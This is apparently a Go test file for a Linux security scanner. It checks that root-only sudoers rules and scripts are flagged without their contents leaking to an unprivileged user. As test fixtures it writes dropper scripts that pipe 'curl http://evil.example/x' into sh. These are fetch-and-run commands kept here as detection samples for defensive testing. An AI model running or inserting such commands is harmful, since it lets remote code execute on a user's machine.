package collectors

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/BuFuuu/based/internal/inspect"
	"github.com/BuFuuu/based/internal/model"
	"github.com/BuFuuu/based/internal/pacman"
	"github.com/BuFuuu/based/internal/scan"
)

// asOtherUser makes the scan report to a user who owns none of the test's
// files, as a root scan does for files only root can read.
func asOtherUser(t *testing.T) {
	inspect.LimitContentTo(os.Getuid()+12345, nil)
	t.Cleanup(func() { inspect.LimitContentTo(-1, nil) })
}

// openDir makes a temp folder the other user can enter.
func openDir(t *testing.T) string {
	dir := t.TempDir()
	os.Chmod(dir, 0o755)
	os.Chmod(filepath.Dir(dir), 0o755)
	return dir
}

func testReporter(id string) (*scan.Progress, *scan.Reporter) {
	p := &scan.Progress{Phases: []*scan.Phase{{ID: id}}}
	return p, scan.TestReporter(p, p.Phases[0])
}

func flagCodes(f model.Finding) string {
	var codes []string
	for _, fl := range f.Flags {
		codes = append(codes, fl.Code)
	}
	return strings.Join(codes, " ")
}

func TestPersistenceKeepsVerdictHidesText(t *testing.T) {
	dir := openDir(t)
	secret := filepath.Join(dir, "10_backup")
	os.WriteFile(secret, []byte("alice ALL=(ALL) NOPASSWD: /usr/local/bin/backup\n"), 0o600)
	public := filepath.Join(dir, "20_public")
	os.WriteFile(public, []byte("bob ALL=(ALL) NOPASSWD: /usr/bin/true\n"), 0o644)
	asOtherUser(t)

	if !strings.Contains(string(readFileSmall(secret)), "NOPASSWD") {
		t.Fatal("root can't judge a file only it can read")
	}
	if len(sharedSmall(secret)) != 0 {
		t.Fatal("sharedSmall returned what the user can't read")
	}

	progress, r := testReporter("persistence")
	c := &Persistence{env: &scan.Env{Pacman: &pacman.DB{}, OmarchyPath: t.TempDir(), Home: "/home/nobody"}, r: r}
	for _, p := range []string{secret, public} {
		c.systemFile("sudo rule", p, meaningful(p, 3), model.FlagSudoers, model.FlagNoPasswd)
	}
	es, fs := progress.Entries(), progress.Findings()
	if len(es) != 2 || len(fs) != 2 {
		t.Fatalf("%d entries, %d findings", len(es), len(fs))
	}
	if es[0].Runs != hiddenText || fs[0].Preview != "" || fs[0].Facts["runs"] != hiddenText {
		t.Errorf("text of a root-only file reached the result: runs %q, preview %q", es[0].Runs, fs[0].Preview)
	}
	if !strings.Contains(flagCodes(fs[0]), "nopasswd") {
		t.Errorf("the verdict was lost: flags %s", flagCodes(fs[0]))
	}
	if !strings.Contains(es[1].Runs, "bob ALL") || !strings.Contains(fs[1].Preview, "bob ALL") {
		t.Errorf("a readable file lost its text: runs %q", es[1].Runs)
	}
}

func TestRootLooksIntoLockedHomeFolders(t *testing.T) {
	home := openDir(t)
	outside := t.TempDir()
	os.WriteFile(filepath.Join(outside, "secret"), []byte("#!/bin/sh\ncurl http://x | sh\n"), 0o755)

	locked := filepath.Join(home, ".hidden")
	os.Mkdir(locked, 0o700)
	os.WriteFile(filepath.Join(locked, "dropper"), []byte("#!/bin/sh\ncurl http://evil.example/x | sh\n"), 0o755)
	os.WriteFile(filepath.Join(locked, "notes"), []byte("text"), 0o600)
	os.Symlink(outside, filepath.Join(locked, "away"))                       // a link inside: not followed
	os.Symlink(filepath.Join(outside, "secret"), filepath.Join(locked, "s")) // nor this one
	os.Symlink(outside, filepath.Join(home, "link"))                         // a skipped path that is a link

	asOtherUser(t)
	progress, r := testReporter("files.home")
	env := &scan.Env{Home: home, UserPart: scan.TestUserPart(map[string]scan.PhaseResult{
		"files.home": {
			Note:       "2 files",
			Unreadable: 3,
			Stats:      map[string]int{"unreadable:" + scan.TopDir(home): 3},
			Skipped:    []string{locked, filepath.Join(home, "link"), "/etc"},
		},
	})}
	if err := (&HomeFiles{}).Collect(context.Background(), env, r); err != nil {
		t.Fatal(err)
	}
	fs := progress.Findings()
	if len(fs) != 1 {
		t.Fatalf("got %d findings, want the dropper only: %+v", len(fs), fs)
	}
	f := fs[0]
	if f.Subject != filepath.Join(locked, "dropper") || !strings.Contains(flagCodes(f), "sus-script") {
		t.Errorf("finding %s, flags %s", f.Subject, flagCodes(f))
	}
	if f.Preview != "" || f.Facts["sha256"] != "" || strings.Contains(f.Facts["type"], "/bin/sh") {
		t.Errorf("contents of a root-only file reached the result: %q %v", f.Preview, f.Facts)
	}
	ph := progress.Phases[0]
	if got := ph.Unreadable.Load(); got != 2 {
		t.Errorf("unreadable %d, want 2 (the link and /etc stay skipped)", got)
	}
	if got := ph.Done.Load(); got != 2 {
		t.Errorf("done %d, want the 2 files in the locked folder", got)
	}
	if !strings.Contains(ph.Note, "2 only root can read") {
		t.Errorf("note %q", ph.Note)
	}
}
